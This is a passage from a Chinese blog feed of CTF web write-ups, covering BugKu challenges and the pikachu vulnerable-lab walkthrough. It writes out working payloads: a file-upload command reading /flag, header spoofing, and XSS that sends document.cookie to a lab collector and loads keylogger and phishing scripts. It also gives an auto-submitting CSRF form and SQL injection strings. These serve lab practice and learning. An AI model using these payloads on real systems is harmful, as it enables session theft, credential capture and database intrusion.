title="Flask_FileUpload"></a>Flask_FileUpload</h2><p>创建111.txt并输入</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br></pre></td></tr></table></figure><p>修改文件名为111.jpg后上传文件即可得到flag</p><p><img src="https://s2.loli.net/2022/04/24/A7mIp28bU3tLDyT.png" alt="flaskfileupload.png"></p><h2 id="滑稽"><a href="#滑稽" class="headerlink" title="滑稽"></a>滑稽</h2><p><img src="https://s2.loli.net/2022/04/24/Mewq2vpiEzYT7mg.png" alt="huaji1.png"></p><p>F12后，ctrl+f搜索flag即可</p><p><img src="https://s2.loli.net/2022/04/24/F78NBcCUD1szXb9.png" alt="huaji.png"></p><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>F12，修改长度限制，随后输入正确计算结果即可。</p><p><img src="https://s2.loli.net/2022/04/24/Waq4kS6ZLHjeoNl.png" alt="jisuanqi.png"></p><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p><img src="https://s2.loli.net/2022/04/24/Npb6VZol3mInsBH.png" alt="GET.png"></p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p><img src="https://s2.loli.net/2022/04/24/B7LzEGeklKOoWrn.png" alt="POST.png"></p><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>第一个条件是不能为数字，第二个条件是&#x3D;&#x3D;比较，和整型比较是会先把字符串转化为整型，’1admin’在比较时候会变成1</p><p><img src="https://s2.loli.net/2022/04/24/5Ol9HLuM1oeRhkN.png" alt="maodun.png"></p><h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><p>查看源代码</p><p><img src="https://s2.loli.net/2022/04/24/FsegtnxZPRb9rJa.png" alt="alert1.png"></p><p>放到html中显示</p><p><img src="https://s2.loli.net/2022/04/24/hfzmJFR91PDweGs.png" alt="alert2.png"></p><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>burp suite抓包</p><p><img src="https://s2.loli.net/2022/04/24/NwaztUknmE8bplS.png" alt="pleasestop.png"></p><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>关键在于这一句</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>); </span><br></pre></td></tr></table></figure><p>故传入args&#x3D;GLOBALS,最后会输出​GLOBALS,flag就在其中</p><p><img src="https://s2.loli.net/2022/04/24/syhBUpZaqRP7n1d.png" alt="var1.png"></p><h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>抓包查看响应包</p><p><img src="https://s2.loli.net/2022/04/24/yvD9piJZXMmFKQt.png" alt="head.png"></p><h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>提示有无后门，用御剑扫描一下发现shell.php</p><p><img src="https://s2.loli.net/2022/04/24/PbH69l3sUem4DoV.png" alt="webhack1.png"></p><p>进入后发现需要输入密码</p><p><img src="https://s2.loli.net/2022/04/24/8tbwWkHPKyhC47V.png" alt="webhack2.png"></p><p>用burp爆破获得密码</p><p><img src="https://s2.loli.net/2022/04/24/uzrAfldKvnTo4B7.png" alt="webhack3.png"></p><p>输入密码后得到flag</p><p><img src="https://s2.loli.net/2022/04/24/8dpoyg6bMSNfELr.png" alt="webhack4.png"></p><h2 id="本地管理员"><a href="#本地管理员" class="headerlink" title="本地管理员"></a>本地管理员</h2><p>F12查看发现编码</p><p><img src="https://s2.loli.net/2022/04/24/MmrcLXi34WOEzKI.png" alt="localadmin1.png"></p><p>放进base64中解密得到密码，由于是管理员，故猜测账户为admin</p><p><img src="https://s2.loli.net/2022/04/24/ZjtPILEszfDlwkV.png" alt="localadmin2.png"></p><p>输入后发现ip被ban</p><p><img src="https://s2.loli.net/2022/04/24/x9lPEfVbmnZzwHX.png" alt="localadmin3.png"></p><p>使用burp进行ip伪造获取flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-FORWARDED-FOR:127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/24/j2W6BIwP4nO79hE.png" alt="localadmin4.png"></p><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>F12查看得到代码</p><p><img src="https://s2.loli.net/2022/04/24/O2yuU3kj7dmB4Kx.png" alt="sourcecode1.png"></p><p>用以下代码解码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="string">&#x27;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="string">&#x27;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">unescape</span>(p1) + <span class="built_in">unescape</span>(<span class="string">&#x27;%35%34%61%61%32&#x27;</span> + p2))</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/24/BDo9MWTAtYE5Xk1.png" alt="sourcecode2.png"></p><p>输入密码即可得到flag</p><p><img src="https://s2.loli.net/2022/04/24/1XUKFIPmZH5we7V.png" alt="sourcecode3.png"></p><h2 id="bp"><a href="#bp" class="headerlink" title="bp"></a>bp</h2><p>根据提示（z?????）猜测为z开头的6位密码，直接用burp爆破（注意加上标记code: ‘bugku10000’，不然所有返回字段都相同）</p><p><img src="https://s2.loli.net/2022/04/24/ifEnaDS5juJv9o6.png" alt="bp.png"></p><h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>使用扫描工具扫描（<a href="https://github.com/WangYihang/SourceLeakHacker">SourceLeakHacker</a>）</p><p><img src="https://s2.loli.net/2022/04/24/FSgYfPL5q2m1xR3.png" alt="beifen1.png"></p><p>输入&#x2F;index.php.bak后缀下载得到源文件index.php.bak</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);  <span class="comment">//strstr 获得URI从&#x27;?&#x27;往后(包括&#x27;?&#x27;)的字符串</span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">1</span>); <span class="comment">//substr 去掉&#x27;?&#x27;</span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>); <span class="comment">//把$str中的所有key去掉</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>); <span class="comment">//把字符串解析到变量里</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123; <span class="comment">//key1和key2的md5值相等但二者不恒等</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11514/?kekeyy1=QNKCDZO&amp;kekeyy2=240610708</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://s2.loli.net/2022/04/24/ScwQDT3s6GlRnpy.png" alt="beifen2.png"></p><p>介绍一批md5是0e开头的字符串</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e50936721341820670084200876351</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BugKu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场刷题记录</title>
      <link href="/2022/04/21/pikachu/"/>
      <url>/2022/04/21/pikachu/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Web-pikachu靶场记录"><a href="#CTF-Web-pikachu靶场记录" class="headerlink" title="CTF Web pikachu靶场记录"></a>CTF Web pikachu靶场记录</h1><blockquote><p>简单记录下pikachu靶场刷题历程</p><p>参考资料：</p><p><a href="https://www.bilibili.com/video/BV1Qh411D7mN?share_source=copy_web">全程讲解视频</a></p><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/105699852?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165035634216782184636212%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165035634216782184636212&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105699852.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3&spm=1018.2226.3001.4187">pikachu靶场wp1</a></p><p><a href="https://blog.csdn.net/weixin_44288604/article/details/107880269?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165020809116780255213643%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165020809116780255213643&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-107880269.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=pikachu&spm=1018.2226.3001.4187">pikachu靶场wp2</a></p></blockquote><h2 id="靶场环境配置"><a href="#靶场环境配置" class="headerlink" title="靶场环境配置"></a>靶场环境配置</h2><blockquote><p>可以参照本篇博客：<a href="https://www.webxlab.net/article/detail/OmAE5oMAar">https://www.webxlab.net/article/detail/OmAE5oMAar</a></p></blockquote><p>初始界面如下：</p><p><img src="https://s2.loli.net/2022/04/21/UPZhWdKINOnD8V7.png" alt="brief_intro.png"></p><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>使用burp suite即可</p><p>burpsuite无法拦截本地包：<a href="https://blog.csdn.net/qq_38923350/article/details/112497437?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1">https://blog.csdn.net/qq_38923350/article/details/112497437?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1</a></p><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>使用intruder模块即可</p><h3 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h3><p>验证码不过期 </p><h3 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h3><p>直接爆破</p><h3 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h3><p>token可以获取并放入下一次爆破 注意选择合适的爆破方式（pitchfork）</p><h2 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h2><h3 id="反射型XSS（get）"><a href="#反射型XSS（get）" class="headerlink" title="反射型XSS（get）"></a>反射型XSS（get）</h3><p>输入一些特殊字符试一下 如果有输入字符限制（前端），可F12直接修改限制值</p><h3 id="反射型XSS（post）"><a href="#反射型XSS（post）" class="headerlink" title="反射型XSS（post）"></a>反射型XSS（post）</h3><p>登陆后输入payload</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>先特殊字符试下，然后输入payload</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&quot;+str+&quot;&#x27;</span>&gt;</span>what do you see?<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;</span><br></pre></td></tr></table></figure><p>构造payload替换掉”+str+”，payload为#’ onclick &#x3D; “alert(‘evolution’)”&gt;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span><br></pre></td></tr></table></figure><h3 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#&#x27; onclick = &quot;alert(&#x27;evolution&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h3><p>输入payload</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>网页后缀改为admin_login.php，查看信息</p><h3 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScrIpt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">sCriPt</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">q&#x27;onclick=&#x27;alert(1111)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/TNlce25h3JUnP71.png" alt="xss_htmlspecialchars.png"></p><h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(&#x27;evolution&#x27;)</span><br></pre></td></tr></table></figure><h3 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">e&#x27;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;evolution&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="pikachu-Xss-后台"><a href="#pikachu-Xss-后台" class="headerlink" title="pikachu Xss 后台"></a>pikachu Xss 后台</h2><p>pkxss后台：</p><p><a href="http://127.0.0.1:8081/pikachu/pkxss/pkxss_login.php">http://127.0.0.1:8081/pikachu/pkxss/pkxss_login.php</a></p><h3 id="cookie搜集"><a href="#cookie搜集" class="headerlink" title="cookie搜集"></a>cookie搜集</h3><h4 id="get型："><a href="#get型：" class="headerlink" title="get型："></a>get型：</h4><p>在反射型xss（get）中输入payload（注意取消前端字符长度的限制）</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;http://127.0.0.1:8081/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F127.0.0.1%3A8081%2Fpikachu%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&amp;submit=submit</span><br></pre></td></tr></table></figure><p>还可以更改一下，让他继续跳转到正常界面（伪装一下）</p><p>修改pikachu\pkxss\xcookie\cookie.php文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1:8081/pikachu/index.php&quot;</span>);<span class="comment">//重定向到一个可信的网站</span></span><br></pre></td></tr></table></figure><h4 id="post型"><a href="#post型" class="headerlink" title="post型"></a>post型</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/pkxss/xcookie/post.html</span><br></pre></td></tr></table></figure><p>注意修改pikachu\pkxss\xcookie\post.html文件中的两个地址链接</p><h4 id="cookie后台信息"><a href="#cookie后台信息" class="headerlink" title="cookie后台信息"></a>cookie后台信息</h4><p><img src="https://s2.loli.net/2022/04/21/BImJ45QWKCT7vnD.png" alt="xss_cookie.png"></p><h3 id="钓鱼结果"><a href="#钓鱼结果" class="headerlink" title="钓鱼结果"></a>钓鱼结果</h3><p>修改pikachu\pkxss\xfish\fish.php中的链接地址（其中的空格要去掉）</p><p>存储型xss题目留言板中输入</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/pkxss/xfish/fish.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/pkxss/xfish/fish.php&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/He3G9hPEsKyVR5c.png" alt="xss_fish.png"></p><h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><p>修改pikachu\pkxss\rkeypress\rk.js中第54行地址链接</p><p>存储型xss题目留言板中输入</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/pkxss/rkeypress/rk.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/ZQKcLsS3tBixVwq.png" alt="xss_keyboard.png"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p>若进入编辑页面出现如下错误：</p><p><img src="https://s2.loli.net/2022/04/21/q73znWeTiNZjVdA.png" alt="csrf_error.png"></p><p>将pikachu\vul\csrf\csrfget\csrf_get_edit.php文件中的MYSQL_ASSOC修改为MYSQLI_ASSOC即可(<strong>各个题目中相同报错同理</strong>)</p><blockquote><p>参考：<a href="https://blog.csdn.net/mastergu2/article/details/107904129">https://blog.csdn.net/mastergu2/article/details/107904129</a></p></blockquote><p>观察流量包：</p><p><img src="https://s2.loli.net/2022/04/21/vkdSNTHtz4mLoPK.png" alt="csrf_get.png"></p><p>构造url：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=12345678922&amp;add=earth&amp;email=lucy%40pikachu.com&amp;submit=submit</span><br></pre></td></tr></table></figure><h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>构造post.html即可</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;postsubmit&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:8081/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111111111&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;usa&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;lucy@pikachu.com&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>url构造为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/csrf/csrfpost/post.html</span><br></pre></td></tr></table></figure><blockquote><p>参考博客：<a href="https://blog.csdn.net/xuandao_ahfengren/article/details/105699852?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165035634216782184636212%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165035634216782184636212&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105699852.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=pikachu%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3&spm=1018.2226.3001.4187">pikachu靶场wp1</a></p></blockquote><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>很好的防御CSRF攻击的方法。</p><h2 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h2><h3 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h3><p>传入参数修改为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 or 1 = 1</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/21/e6lwziJvnFQqxbo.png" alt="sql_post.png"></p><h3 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; or 1=1#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; or 1=1-- </span><br></pre></td></tr></table></figure><p>注意第二个payload最后有个空格</p><h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e%&#x27; or 1=1#</span><br></pre></td></tr></table></figure><h3 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e&#x27;) or 1=1#</span><br></pre></td></tr></table></figure><h3 id="“insert-x2F-update”注入"><a href="#“insert-x2F-update”注入" class="headerlink" title="“insert&#x2F;update”注入"></a>“insert&#x2F;update”注入</h3><blockquote><p>基于报错的注入可利用的3个函数：</p><ul><li>updatexml()</li><li>extractvalue()</li><li>floor()</li></ul></blockquote><h4 id="insert（注册）"><a href="#insert（注册）" class="headerlink" title="insert（注册）"></a>insert（注册）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evolution&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure><h4 id="update（修改）"><a href="#update（修改）" class="headerlink" title="update（修改）"></a>update（修改）</h4><figure 